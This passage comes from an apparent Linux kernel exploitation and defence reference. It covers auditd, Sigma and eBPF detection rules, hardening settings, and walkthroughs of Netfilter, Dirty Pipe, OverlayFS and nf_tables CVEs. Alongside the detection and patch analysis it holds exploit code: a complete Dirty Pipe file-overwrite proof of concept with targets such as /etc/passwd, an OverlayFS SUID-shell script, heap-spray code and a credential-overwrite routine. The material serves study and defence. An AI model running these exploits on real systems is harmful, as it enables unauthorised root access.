# Detect madvise with MADV_DONTNEED (value 4) — used in Dirty COW and heap shaping
-a always,exit -F arch=b64 -S madvise -F a2=4 -k madvise_dontneed

# Detect MAP_FIXED mmap (flag 0x10) — potential library replacement
-a always,exit -F arch=b64 -S mmap -F a3&=0x10 -k mmap_fixed
```

#### Sigma rules for memory manipulation

```yaml
# sigma_mprotect_exec.yml
title: Suspicious mprotect Adding Execute Permission
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects mprotect syscall adding PROT_EXEC, potentially activating shellcode
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: mprotect
    filter_known:
        exe|endswith:
            - '/java'
            - '/node'
            - '/python3'
            - '/qemu-system-x86_64'
    condition: selection and not filter_known
level: medium
tags:
    - attack.defense_evasion
    - attack.t1055

---
# sigma_anon_exec_region.yml
title: Anonymous Executable Memory Region Detected
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: >
    Detects processes with anonymous executable memory regions,
    which may indicate injected shellcode or JIT-compiled payloads.
logsource:
    product: linux
    service: custom
    definition: Custom log from vma_anomaly_scanner or eBPF probe
detection:
    selection:
        EventType: ANON_EXEC
    filter_jit:
        ProcessName|endswith:
            - '/java'
            - '/node'
            - '/chrome'
            - '/firefox'
    condition: selection and not filter_jit
level: high
tags:
    - attack.execution
    - attack.t1059
```

#### eBPF tracing probes for mmap/mprotect

```c
/* mmap_wx_probe.bpf.c — eBPF kprobe to detect W+X mmap calls.
 * Attach to the mmap syscall entry. Requires bpftrace or libbpf.
 * Equivalent bpftrace one-liner:
 *   bpftrace -e 'tracepoint:syscalls:sys_enter_mmap
 *     /args->prot & 0x6 == 0x6/
 *     { printf("PID %d (%s): W+X mmap prot=0x%x addr=0x%lx len=0x%lx\n",
 *       pid, comm, args->prot, args->addr, args->len); }'
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct event {
    __u32 pid;
    __u32 prot;
    __u64 addr;
    __u64 len;
    char  comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 16);
} events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_mmap")
int trace_mmap_enter(struct trace_event_raw_sys_enter *ctx) {
    unsigned long prot = ctx->args[2];

    /* Check for PROT_WRITE | PROT_EXEC (0x2 | 0x4 = 0x6) */
    if ((prot & 0x6) != 0x6)
        return 0;

    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;

    e->pid  = bpf_get_current_pid_tgid() >> 32;
    e->prot = (__u32)prot;
    e->addr = ctx->args[0];
    e->len  = ctx->args[1];
    bpf_get_current_comm(e->comm, sizeof(e->comm));

    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

For rapid deployment without compiling a custom BPF program, `bpftrace` one-liners cover the most critical cases:

```bash
# Detect W+X mmap
bpftrace -e 'tracepoint:syscalls:sys_enter_mmap /args->prot & 0x6 == 0x6/ { printf("W+X mmap: pid=%d comm=%s prot=0x%x\n", pid, comm, args->prot); }'

# Detect mprotect adding PROT_EXEC
bpftrace -e 'tracepoint:syscalls:sys_enter_mprotect /args->prot & 0x4/ { printf("mprotect +X: pid=%d comm=%s addr=0x%lx prot=0x%x\n", pid, comm, args->addr, args->prot); }'

# Detect high-frequency MADV_DONTNEED (Dirty COW indicator)
bpftrace -e 'tracepoint:syscalls:sys_enter_madvise /args->advice == 4/ { @dontneed[pid, comm] = count(); } interval:s:5 { print(@dontneed); clear(@dontneed); }'
```

---

## 20. Hardening configuration reference

### 20.1 Sysctl settings for memory protection

| Sysctl parameter | Recommended value | Default | Effect |
|---|---|---|---|
| `kernel.randomize_va_space` | `2` | `2` | Full ASLR (stack, mmap, brk, vDSO). `0` = off, `1` = partial (no brk). |
| `vm.mmap_rnd_bits` | `32` | `28` (x86_64) | Bits of randomization for mmap base. Max 32 on x86_64 4-level. |
| `vm.mmap_rnd_compat_bits` | `16` | `8` | Bits of randomization for 32-bit compat processes. Max 16. |
| `vm.mmap_min_addr` | `65536` | `65536` | Minimum mmap address. Prevents NULL-deref-to-kernel-pointer exploits. |
| `kernel.kptr_restrict` | `2` | `1` | `0` = kernel pointers visible. `1` = hidden from non-`CAP_SYSLOG`. `2` = hidden from all. Prevents physmap/KASLR leaks via `/proc/kallsyms`. |
| `kernel.dmesg_restrict` | `1` | `0` | Restrict `dmesg` to `CAP_SYSLOG`. Kernel log often contains pointer leaks. |
| `kernel.perf_event_paranoid` | `3` | `2` | `3` = no perf for unprivileged users. Perf events can leak kernel addresses. |
| `vm.unprivileged_userfaultfd` | `0` | `1` | Disable unprivileged `userfaultfd`. Closes the race-window primitive (Chapter 2B §6). |
| `kernel.yama.ptrace_scope` | `2` or `3` | `1` | `2` = admin-only ptrace. `3` = no ptrace. Prevents `/proc/PID/maps` cross-process reading and PTRACE_ATTACH. |
| `vm.max_map_count` | `65530` | `65530` | Max VMAs per process. Lower values limit mmap-based VMA exhaustion DoS. |

### 20.2 Kernel configuration options

| Config option | Recommended | Effect |
|---|---|---|
| `CONFIG_PAGE_TABLE_ISOLATION` | `y` | KPTI — mitigates Meltdown (§10.3). |
| `CONFIG_RANDOMIZE_BASE` | `y` | KASLR — randomizes kernel base address. |
| `CONFIG_RANDOMIZE_MEMORY` | `y` | Randomizes physmap, vmalloc, vmemmap. |
| `CONFIG_STRICT_DEVMEM` | `y` | Restricts `/dev/mem` to I/O regions. |
| `CONFIG_IO_STRICT_DEVMEM` | `y` | Further restricts `/dev/mem` to unclaimed I/O. |
| `CONFIG_DEVKMEM` | `n` | Disables `/dev/kmem` entirely. |
| `CONFIG_VMAP_STACK` | `y` | Kernel stacks via vmalloc with guard pages. |
| `CONFIG_X86_VSYSCALL_EMULATE` or `_NONE` | `NONE` if compat not needed | Eliminates vsyscall as ROP gadget source. |
| `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` | `y` | Zero-fill all page allocations. |
| `CONFIG_INIT_ON_FREE_DEFAULT_ON` | `y` | Zero-fill freed pages. Blocks physmap data leaks. |
| `CONFIG_DEBUG_WX` | `y` | Warns on W+X kernel mappings at boot. |

### 20.3 Artifacts table — telemetry per attack technique

| Attack technique | Telemetry source | Artifact | Detection method |
|---|---|---|---|
| Format string info leak (§13.1) | Application logs, network capture | Output containing `0x7f`-prefixed hex addresses | Log regex for leaked pointer patterns; WAF rules for `%p`/`%x` in input |
| `/proc/self/maps` reading (§13.2) | auditd `openat` syscall | `openat` of `/proc/self/maps` or `/proc/PID/maps` | auditd rule `-w /proc -p r -k proc_maps` |
| ASLR brute-force (§13.3) | Service crash logs, coredump count | Rapid child process crashes with `SIGSEGV` | Monitor `SIGSEGV` signal rate per service; anomaly threshold on fork rate |
| Partial overwrite (§13.4) | Coredump analysis | Return address with only low bytes modified | Post-mortem: compare crashed RIP against known function offsets |
| Stack Clash (§14) | Kernel `dmesg`, coredumps | Stack VMA overlapping adjacent VMA; `SIGSEGV` with `%rsp` in mmap region | Monitor `RLIMIT_STACK` violations; check `vm_start` of stack VMA vs adjacent VMAs |
| Dirty COW (§15) | File integrity monitoring | File hash mismatch without corresponding `write`/`open(O_WRONLY)` audit event | AIDE/OSSEC file integrity baseline comparison; auditd `madvise(MADV_DONTNEED)` rate |
| Heap shaping (§16) | eBPF tracepoint on `sys_enter_mmap`/`sys_enter_munmap` | Rapid mmap/munmap cycles (>1000/sec) from non-allocator process | bpftrace rate monitoring; threshold alerting |
| MAP_FIXED abuse (§17) | `/proc/PID/maps` scan | Anonymous mapping replacing file-backed library VMA; `rwx` permissions on anonymous region | VMA anomaly scanner (§19.1); periodic maps polling |
| Ret2dir (§18.1) | `/proc/PID/pagemap` access audit | `openat` of `/proc/self/pagemap` by non-root | auditd rule on pagemap access; `CAP_SYS_ADMIN` check |
| PTE overwrite (§18.2) | Kernel integrity monitor | Modified page table entries; unexpected W+X kernel pages | `CONFIG_DEBUG_WX` warnings; runtime PTE scanning (custom kernel module) |

---

## 21. Memory corruption CVE walkthroughs

This section provides detailed exploitation analysis of four high-impact Linux kernel memory-corruption CVEs. Each subsection covers the vulnerability mechanism, affected kernel versions, step-by-step exploitation, detection indicators, and the patch that fixed it. These CVEs complement the older Dirty COW walkthrough in §15 and the generic techniques in §13–§18.

### 21.1 CVE-2021-22555 — Netfilter heap out-of-bounds write

**Vulnerability class.** Heap out-of-bounds write in the Netfilter `IPT_SO_SET_REPLACE` path, leading to local privilege escalation.

**Affected versions.** Linux 2.6.19 through 5.12 (inclusive). The bug existed since the original `xt_compat` translation code for 32-bit compat `setsockopt` was introduced.

**Mechanism.** When a 32-bit userspace process (or a 64-bit process using `compat_setsockopt`) calls `setsockopt(IPT_SO_SET_REPLACE)` to install a new iptables ruleset, the kernel translates the compat-layout structures into native 64-bit layout in a heap-allocated buffer. The translation loop in `xt_compat_target_from_user` computes the size delta between compat and native structures. Due to an incorrect size calculation when a target with zero-length user data is provided, the kernel writes two bytes of padding (zeroes) past the allocated buffer boundary into the next SLUB object.

The core bug in `net/netfilter/x_tables.c`:

```c
/* Before patch — simplified */
static int xt_compat_target_from_user(struct xt_entry_target *t,
                                       void **dstptr, unsigned int *size)
{
    /* ... copy from compat to native ... */
    /* BUG: pad is written at target_size - 1, but the allocation was
       sized using the compat (smaller) target_size, so the memset
       overflows into the next object. */
    memset(target + target_size - pad, 0, pad);  /* OOB write */
}
```

The attacker controls the Netfilter rule content, allowing precise control over the overflow size and partially over the overflow data (zeroed bytes).

**Exploitation walkthrough.** Andy Nguyen's (theflow0) public exploit uses this OOB write to corrupt a `msg_msg` structure in an adjacent SLUB slab object:

1. **Heap grooming.** Spray `msg_msg` objects using `msgsnd()` to fill the target slab cache (`kmalloc-64` or similar). The `msg_msg` header (48 bytes) contains `m_list.next`, `m_list.prev`, `m_type`, and `m_ts` (message size). By filling the slab, the attacker ensures the next allocation from the same cache lands adjacent to a controlled `msg_msg`.

2. **Trigger the OOB write.** Call `setsockopt(IPT_SO_SET_REPLACE)` with a crafted compat-format Netfilter ruleset containing a target with zero user data length. The two-byte zero write corrupts the `m_ts` field of the adjacent `msg_msg`, enlarging the reported message size.

3. **Information leak.** Call `msgrcv()` on the corrupted message. Because `m_ts` is now larger than the actual allocation, the kernel copies past the `msg_msg` buffer, leaking adjacent kernel heap data. This leaks kernel pointers, defeating KASLR.

4. **Arbitrary free.** Using the same OOB write, corrupt `m_list.next` of a `msg_msg` to point at a target kernel object (e.g., a `struct pipe_buffer`). Freeing the message via `msgrcv()` causes `list_del` on the corrupted list pointer, giving an arbitrary free primitive.

5. **Privilege escalation.** Use the arbitrary free to build a use-after-free on a `pipe_buffer`, then overwrite its `ops` pointer to redirect `pipe_buf_release` to a controlled ROP chain that calls `commit_creds(prepare_kernel_cred(NULL))`.

```c
/* Simplified proof-of-concept trigger (not full exploit) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/netfilter_ipv4/ip_tables.h>

/*
 * The compat setsockopt path requires either:
 *  - A 32-bit binary calling setsockopt() directly, or
 *  - A 64-bit process calling the compat ioctl path.
 * This PoC sketch shows the trigger structure.
 */
int trigger_oob_write(void)
{
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return -1;

    /* Build a minimal ipt_replace with a crafted target entry
       whose user data size is 0, triggering the pad overflow. */
    struct ipt_replace repl = {0};
    strncpy(repl.name, "filter", sizeof(repl.name));
    repl.num_entries    = 1;
    repl.num_counters   = 1;
    repl.size           = /* carefully computed size */;

    /* The actual entry + target construction requires precise
       layout matching the kernel's xt_compat_target_from_user
       parsing. Omitted for brevity — see theflow0's public PoC. */

    /* Trigger the compat translation path */
    setsockopt(fd, SOL_IP, IPT_SO_SET_REPLACE, &repl, sizeof(repl));
    /* This fails with ENOPROTOOPT or similar, but the OOB write
       has already occurred in the kernel before validation rejects
       the ruleset. */
    return 0;
}
```

**Detection indicators.** The `setsockopt(IPT_SO_SET_REPLACE)` call from an unprivileged process (or any process not managing iptables) is suspicious. An auditd rule on `setsockopt` with `SO_SET_REPLACE` catches the trigger. Post-exploitation, the `msg_msg` corruption produces no direct log entry, but anomalous `msgrcv` sizes (larger than any legitimate `msgsnd`) are detectable via eBPF tracing.

**Patch analysis.** The fix (commit `b29c457a6511`, merged 5.13-rc1) corrects the padding calculation in `xt_compat_target_from_user` and `xt_compat_match_from_user`. The `memset` pad offset is computed from the native (larger) size rather than the compat (smaller) size, preventing the overflow:

```c
/* After patch — padding uses correct native offset */
memset(target + native_size - pad, 0, pad);
```

### 21.2 CVE-2022-0847 — Dirty Pipe

**Vulnerability class.** Improper initialization of pipe buffer flags, allowing arbitrary write to page-cache-backed files regardless of file permissions.

**Affected versions.** Linux 5.8 through 5.16.11 / 5.15.25 / 5.10.102. The bug was introduced in commit `f6dd975583bd` (Linux 5.8), which refactored the pipe buffer merging logic.

**Mechanism.** The pipe subsystem maintains per-buffer flags in `struct pipe_buffer`. The flag `PIPE_BUF_FLAG_CAN_MERGE` indicates that subsequent `write()` calls can append data into the existing page rather than allocating a new page. When `splice()` moves a page from a file into a pipe, it should clear all flags because the page now belongs to the page cache (not to the pipe). The bug: `copy_page_to_iter_pipe` and `push_pipe` failed to clear `PIPE_BUF_FLAG_CAN_MERGE` on pages pushed via `splice`.

If the attacker:

1. Creates a pipe and fills it with data (causing `PIPE_BUF_FLAG_CAN_MERGE` to be set on the pipe buffers).
2. Drains the pipe completely (the buffers remain allocated with the flag still set).
3. Uses `splice()` to move a page from a target file into the pipe (the flag is NOT cleared).
4. Writes data to the pipe — the kernel sees `PIPE_BUF_FLAG_CAN_MERGE` and appends the data directly into the page cache page.

The write goes into the page cache, modifying the file content. Because this bypasses the VFS `write` path entirely (no permission check, no `inode->i_mutex`, no `file->f_mode` check), the attacker can overwrite any file they can `open()` for reading.

**Exploitation walkthrough.**

```c
/* dirty_pipe_poc.c — CVE-2022-0847 exploitation
 * Overwrites arbitrary file content at a controlled offset.
 * Requires: read permission on target file.
 * Does NOT require: write permission, root, any capability.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <target_file> <offset> <data>\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    off_t offset = atol(argv[2]);
    const char *data = argv[3];
    size_t data_len = strlen(data);

    /* The offset within the page must be > 0 because splice always
       fills from the start of a page. We need the splice to set up
       the page, then our write appends within the same page. */
    if (offset % 4096 == 0) {
        fprintf(stderr, "Offset must not be page-aligned\n");
        return 1;
    }

    int fd = open(target, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int pipefd[2];
    pipe(pipefd);

    /* Step 1: Fill the pipe to set PIPE_BUF_FLAG_CAN_MERGE on all
       pipe_buffer slots. */
    char buf[4096];
    memset(buf, 'A', sizeof(buf));
    for (unsigned i = 0; i < (unsigned)(fcntl(pipefd[1], F_GETPIPE_SZ) / sizeof(buf)); i++)
        write(pipefd[1], buf, sizeof(buf));

    /* Step 2: Drain the pipe — buffers remain with the flag set. */
    for (unsigned i = 0; i < (unsigned)(fcntl(pipefd[0], F_GETPIPE_SZ) / sizeof(buf)); i++)
        read(pipefd[0], buf, sizeof(buf));

    /* Step 3: Splice the target file page into the pipe.
       The page-cache page replaces the pipe buffer's page,
       but PIPE_BUF_FLAG_CAN_MERGE is NOT cleared (the bug). */
    off_t splice_offset = offset & ~0xFFFUL; /* page-align down */
    ssize_t n = splice(fd, &splice_offset, pipefd[1], NULL, 1, 0);
    if (n <= 0) { perror("splice"); return 1; }

    /* Step 4: Write into the pipe at the offset within the page.
       The kernel sees CAN_MERGE and writes directly into the
       page-cache page — modifying the file. */
    size_t in_page_offset = offset % 4096;
    /* The splice put 1 byte at offset 0 of the page. We need to
       advance to in_page_offset. Write (in_page_offset - 1) bytes
       of padding, then our payload... but actually the trick is
       simpler: splice only reads 1 byte, so the pipe buffer's
       offset/len covers just 1 byte. Our write appends at offset 1.
       We pad to the desired in-page offset, then write data. */
    size_t pad = in_page_offset - 1;
    if (pad > 0) write(pipefd[1], buf, pad);
    write(pipefd[1], data, data_len);

    printf("Wrote %zu bytes to %s at offset %ld\n", data_len, target, offset);
    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);
    return 0;
}
```

**Common exploitation targets:**

- Overwrite `/etc/passwd` to add a root-equivalent user or change the root password hash.
- Overwrite a SUID binary's `.text` at a controlled offset to inject a short shellcode stub.
- Overwrite `/etc/shadow` (if readable, e.g., via group `shadow`).
- Overwrite cron configurations for persistent access.

**Comparison with Dirty COW (§15).** Both allow writing to read-only files, but through entirely different mechanisms:

| Aspect | Dirty COW (CVE-2016-5195) | Dirty Pipe (CVE-2022-0847) |
|---|---|---|
| Bug class | Race condition in COW fault handler | Missing flag initialization in pipe splice |
| Exploitation complexity | Requires race winning (may need many attempts) | Deterministic, single-shot |
| Kernel versions | 2.6.22 – 4.8.3 | 5.8 – 5.16.11 |
| Write mechanism | Direct page table manipulation during COW | Write to page cache via pipe buffer merge |
| Reliability | Probabilistic (race-dependent) | 100% reliable |
| Detection | `madvise(MADV_DONTNEED)` frequency spike | `splice` followed by `write` to pipe with page-cache page |

**Detection indicators.** The attack produces no `write` syscall on the target file — file integrity monitoring (AIDE, OSSEC) detects the *result* (changed hash) but not the *mechanism*. Detecting the mechanism requires eBPF tracing on `splice` and `pipe_write`, checking for `PIPE_BUF_FLAG_CAN_MERGE` on page-cache-backed pages. A practical bpftrace probe:

```bash
# Detect splice followed by pipe write to same page (Dirty Pipe indicator)
bpftrace -e '
kprobe:splice_to_pipe {
    @splice_pid[tid] = 1;
}
kretprobe:splice_to_pipe {
    delete(@splice_pid[tid]);
}
kprobe:pipe_write {
    if (@splice_pid[tid]) {
        printf("Potential Dirty Pipe: pid=%d comm=%s\n", pid, comm);
    }
}'
```

**Patch analysis.** The fix (commit `9d2231c5d74e`, backported to stable) adds explicit flag clearing in `copy_page_to_iter_pipe` and `push_pipe`:

```c
/* After patch */
buf->ops = &page_cache_pipe_buf_ops;
buf->flags = 0;  /* Clear ALL flags, including CAN_MERGE */
```

### 21.3 CVE-2023-0386 — OverlayFS privilege escalation via FUSE

**Vulnerability class.** Privilege escalation through OverlayFS copy-up preserving SUID/SGID bits from a FUSE-backed lower layer.

**Affected versions.** Linux 5.11 through 6.2-rc (fixed in 6.2 stable and backported to 5.15.x, 5.10.x LTS).

**Mechanism.** OverlayFS merges a lower (read-only) and upper (read-write) filesystem. When a file from the lower layer is modified, the kernel performs a "copy-up": copying the file to the upper layer and applying the modification there. During copy-up, OverlayFS preserves file attributes from the lower layer, including `S_ISUID` and `S_ISGID` mode bits.

The vulnerability arises when the lower layer is a FUSE filesystem controlled by an unprivileged user (via a user namespace with `CAP_SYS_ADMIN` to mount FUSE). The attacker creates a SUID-root binary on the FUSE filesystem. When OverlayFS copies this file up to the upper layer (a real filesystem like ext4), it preserves the SUID bit. The copied-up file is now a real SUID-root binary on a real filesystem, executable by the attacker.

Normally, the kernel should check whether the calling user has the right to create SUID files. The bug is that `ovl_copy_up_one` trusts the lower layer's metadata without re-validating against the mounter's credentials.

**Exploitation walkthrough.**

```bash
#!/bin/bash
# CVE-2023-0386 exploitation sketch
# Requires: unprivileged user namespaces enabled (default on most distros)

set -e

WORKDIR=$(mktemp -d)
LOWER="$WORKDIR/lower"
UPPER="$WORKDIR/upper"
WORK="$WORKDIR/work"
MERGED="$WORKDIR/merged"

mkdir -p "$LOWER" "$UPPER" "$WORK" "$MERGED"

# Step 1: Create a user namespace with CAP_SYS_ADMIN
# (allows FUSE mount and overlay mount inside the namespace)
unshare --user --map-root-user --mount /bin/bash -c '
    # Step 2: Mount a FUSE filesystem as the overlay lower layer.
    # The FUSE handler returns a binary with SUID-root attributes.
    # (In practice, use a custom FUSE daemon or fuse-overlayfs trick)

    # Step 3: Create a SUID binary on the FUSE lower layer
    cp /bin/bash '"$LOWER"'/suid_shell
    chmod 04755 '"$LOWER"'/suid_shell
    # (In the FUSE case, the daemon reports uid=0 ownership
    #  and S_ISUID in stat responses)

    # Step 4: Mount overlayfs
    mount -t overlay overlay \
        -o lowerdir='"$LOWER"',upperdir='"$UPPER"',workdir='"$WORK"' \
        '"$MERGED"'

    # Step 5: Trigger copy-up by touching the file
    chmod +x '"$MERGED"'/suid_shell 2>/dev/null || touch '"$MERGED"'/suid_shell

    # Step 6: The copy-up preserves SUID from the FUSE lower layer.
    # The file now exists in the upper layer with real SUID-root.
    ls -la '"$UPPER"'/suid_shell
'

# Step 7: Execute the SUID binary from the upper layer (or merged view)
# to obtain a root shell.
```

The actual exploit is more nuanced: the FUSE daemon must be crafted to respond to `getattr` with `uid=0` and `mode=04755` while serving the binary content on `read`. Several public exploits (sxlmnwb, xkaneiki) automate this with a custom FUSE server.

**Detection indicators.**

- OverlayFS mounts from within user namespaces: monitor `mount` syscalls where `fstype == overlay` and the caller is in a non-init user namespace.
- FUSE mounts followed by overlay mounts in the same namespace.
- New SUID binaries appearing in overlay upper directories — a file integrity monitor on overlay upper dirs catches the post-exploitation artifact.

```bash
# auditd rule: detect overlay mounts
-a always,exit -F arch=b64 -S mount -F a2=overlay -k overlay_mount

# Detect new SUID files (periodic scan)
find /path/to/overlay/upper -perm -4000 -newer /var/lib/suid_baseline -ls
```

**Patch analysis.** The fix (commit `4f11ada10d0a`) adds a check in `ovl_copy_up_one` that strips SUID/SGID bits during copy-up when the mounter does not have `CAP_FSETID` in the user namespace that owns the superblock. This ensures unprivileged users cannot create privileged binaries via copy-up:

```c
/* After patch — in ovl_copy_up_inode() */
if (!capable_wrt_inode_uidgid(d_inode(newdentry), CAP_FSETID))
    stat->mode &= ~(S_ISUID | S_ISGID);
```

### 21.4 CVE-2024-1086 — nf_tables use-after-free

**Vulnerability class.** Double-free / use-after-free in Netfilter `nf_tables` verdict handling, leading to local privilege escalation.

**Affected versions.** Linux 3.15 through 6.8-rc1. The bug was in `nft_verdict_init` / `nf_hook_slow`, present since the initial `nf_tables` implementation.

**Mechanism.** When an nf_tables rule returns a verdict of `NF_DROP` with a non-zero `chain` reference (an error / special verdict), the `nft_verdict_init` function allocates and stores a reference to the chain. However, `nf_hook_slow` processes the verdict and, in the `NF_DROP` path, calls `kfree_skb` on the packet. The bug is a double-free condition: the verdict cleanup frees the verdict data (including the chain reference), but a second code path also frees the same allocation when the rule is deleted or the chain is flushed.

More precisely, the vulnerability stems from `nft_verdict_init` accepting `NF_DROP` with a chain pointer that should only be valid for `NFT_JUMP`/`NFT_GOTO` verdicts. The chain reference count is incremented during init but decremented on two separate paths (verdict cleanup and chain destruction), leading to a reference count underflow that triggers a use-after-free.

**Exploitation walkthrough.** Notselwyn's public exploit (notselwyn/CVE-2024-1086) demonstrates a full local root from unprivileged user. The strategy uses page-level heap spray:

1. **Trigger the double-free.** Create an nf_tables rule with a verdict that causes the double-free on a `kmalloc-192` object (the verdict structure). Use batch operations to trigger rule evaluation and deletion in sequence.

```c
/* Simplified nf_tables rule setup via netlink (nfnetlink)
   to create a rule with the malicious verdict.
   Full code uses libmnl for netlink communication. */
#include <libmnl/libmnl.h>
#include <linux/netfilter/nf_tables.h>

static int create_malicious_rule(struct mnl_socket *nl,
                                  uint16_t family,
                                  const char *table,
                                  const char *chain)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;

    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_NEWRULE, family,
                                 NLM_F_CREATE | NLM_F_ACK, 0);

    /* Add verdict expression with NF_DROP but with a chain
       reference — this is the invalid combination that triggers
       the double-free. */
    /* ... nftnl rule/expression construction omitted ... */

    return mnl_socket_sendto(nl, nlh, nlh->nlmsg_len);
}
```

2. **Page-level heap spray.** After the double-free, the freed `kmalloc-192` slab object can be reclaimed. The exploit sprays `pipe_buffer` arrays (each 40 bytes x `PIPE_DEF_BUFS` = 640 bytes, fitting into `kmalloc-1024`). By adjusting the spray target and using cross-cache reclamation (freeing the slab page back to the page allocator and re-allocating it in a different cache), the attacker reclaims the freed page with controlled content.

3. **PTE manipulation.** The exploit uses the reclaimed page as a fake page table entry. By controlling the content written to the reclaimed slab object, the attacker forges a PTE that maps a physical page of their choice. This gives arbitrary physical memory read/write.

4. **Credential overwrite.** With arbitrary physical memory access, the attacker locates the current process's `cred` structure in physical memory and overwrites `uid`, `gid`, `euid`, `egid` to zero, and adds full capabilities.

```c
/* Post-exploitation: overwrite cred structure via physmap write */
struct cred *cred = /* located via task_struct traversal */;
/* Zero all UID/GID fields */
unsigned int zero = 0;
write_phys(cred_phys + offsetof(struct cred, uid),  &zero, 4);
write_phys(cred_phys + offsetof(struct cred, gid),  &zero, 4);
write_phys(cred_phys + offsetof(struct cred, euid), &zero, 4);
write_phys(cred_phys + offsetof(struct cred, egid), &zero, 4);

/* Set full capabilities */
kernel_cap_t full = { .val = 0x1FFFFFFFFULL };
write_phys(cred_phys + offsetof(struct cred, cap_effective),
           &full, sizeof(full));
write_phys(cred_phys + offsetof(struct cred, cap_permitted),
           &full, sizeof(full));
write_phys(cred_phys + offsetof(struct cred, cap_inheritable),
           &full, sizeof(full));
```

**Detection indicators.**

- Unprivileged nf_tables operations: `nfnetlink` messages from non-root processes (requires `CAP_NET_ADMIN`, but user namespaces grant this). Monitor `nfnetlink` socket creation in non-init network namespaces.
- Double-free triggers a kernel warning in debug builds: `KASAN: use-after-free in nf_hook_slow`.
- Pipe spray artifact: large number of `pipe` syscalls followed by pipe buffer fills from a single process.

```bash
# auditd rule: detect nfnetlink socket creation
-a always,exit -F arch=b64 -S socket -F a0=16 -F a2=12 -k nfnetlink_socket

# bpftrace: detect nf_tables verdict anomaly
bpftrace -e '
kprobe:nft_verdict_init {
    @verdict_init[pid, comm] = count();
}
interval:s:10 {
    print(@verdict_init);
    clear(@verdict_init);
}'
```

**Patch analysis.** The fix (commit `f342de4e2f33`, merged in 6.8-rc2 and backported) rejects verdicts that specify a chain reference with `NF_DROP` or `NF_ACCEPT` — only `NFT_JUMP` and `NFT_GOTO` are allowed to carry chain references:

```c
/* After patch — in nft_verdict_init() */
switch (data->verdict.code) {
case NFT_JUMP:
case NFT_GOTO:
    /* chain reference is valid here */
    break;
default:
    /* NF_DROP, NF_ACCEPT, etc. must NOT have a chain ref */
    if (tb[NFTA_VERDICT_CHAIN])
        return -EOPNOTSUPP;
    break;
}
```

---

## 22. Advanced memory exploitation techniques

This section extends the ASLR bypass discussion in §13 and the physmap/ret2dir material in §18 with modern kernel exploitation primitives that rely on process address space manipulation.

### 22.1 Cross-cache attacks and elastic objects

Modern SLUB allocator hardening (random freelist, per-CPU partial lists, `CONFIG_SLAB_FREELIST_HARDENED`) makes same-cache exploitation difficult. Cross-cache attacks bypass these by freeing an entire slab page back to the page allocator and reclaiming it in a different slab cache.

**Mechanism.** The SLUB allocator organizes objects into per-cache slabs. Each slab is one or more contiguous pages. When all objects in a slab are freed, the slab is returned to the page allocator's buddy system. The attacker can then trigger an allocation in a *different* slab cache that requests the same order of pages, reclaiming the exact physical page.

The workflow:

1. **Fill the target cache.** Allocate many objects in the victim cache (e.g., `kmalloc-192`) to fill existing partial slabs and force new slab page allocations.
2. **Free all objects in one slab.** This returns the slab page to the page allocator.
3. **Reclaim in the attacker-controlled cache.** Allocate objects in a cache the attacker controls content for (e.g., `msg_msg` via `msgsnd`, `pipe_buffer` via `pipe` + `write`, `sk_buff` via `sendmsg`).
4. **Exploit.** The reclaimed page now contains attacker-controlled data at the same physical address as the freed victim object. If any dangling pointer still references the old object, it now points to attacker-controlled content.

**Elastic objects** are kernel objects whose allocation size is partially user-controlled, letting the attacker target specific slab caches:

| Object | Syscall | Size range | Cache control |
|---|---|---|---|
| `msg_msg` | `msgsnd` | 48–4096 (header + data) | User controls total size |
| `sk_buff` (linear data) | `sendmsg` / `setsockopt` | Variable via `msg_controllen` | Size = header + user data |
| `pipe_buffer` array | `pipe` + `fcntl(F_SETPIPE_SZ)` | `sizeof(struct pipe_buffer) * nr_bufs` | `nr_bufs` via F_SETPIPE_SZ |
| `add_key` payload | `add_key` syscall | User-controlled `plen` | Any size up to `KEYCTL_MAX_PAYLOAD` |
| `setxattr` tmpbuf | `setxattr` | User-controlled `size` | 1 to `XATTR_SIZE_MAX` (64 KiB) |
| `simple_xattr` | `setxattr` on tmpfs/shmem | User-controlled | Persists until removed |

```c
/* Cross-cache reclamation example: reclaim a freed kmalloc-1024
   page with pipe_buffer arrays. */

#define PIPE_SPRAY_COUNT 256
int pipes[PIPE_SPRAY_COUNT][2];

/* Step 1: Trigger vulnerability that frees a kmalloc-1024 object,
   leaving a dangling pointer. Then free all remaining objects
   in that slab to release the slab page. */

/* Step 2: Spray pipe_buffer arrays to reclaim the page. */
for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
    pipe(pipes[i]);
    /* Resize pipe to allocate pipe_buffer array in kmalloc-1024 */
    fcntl(pipes[i][1], F_SETPIPE_SZ, 4096 * 16);  /* 16 bufs */
    /* Write data to populate the pipe_buffer entries */
    char buf[4096];
    memset(buf, 'C', sizeof(buf));
    write(pipes[i][1], buf, sizeof(buf));
}

/* Step 3: The dangling pointer now references a pipe_buffer.
   Trigger the dangling pointer use — e.g., a virtual call through
   pipe_buffer->ops — to hijack control flow. */
```

### 22.2 Page-level heap spray: physmap spray and pipe buffer page reclaim

Beyond same-cache or cross-cache exploitation, the attacker can spray at the page allocator level to control the *physical* content of reclaimed pages.

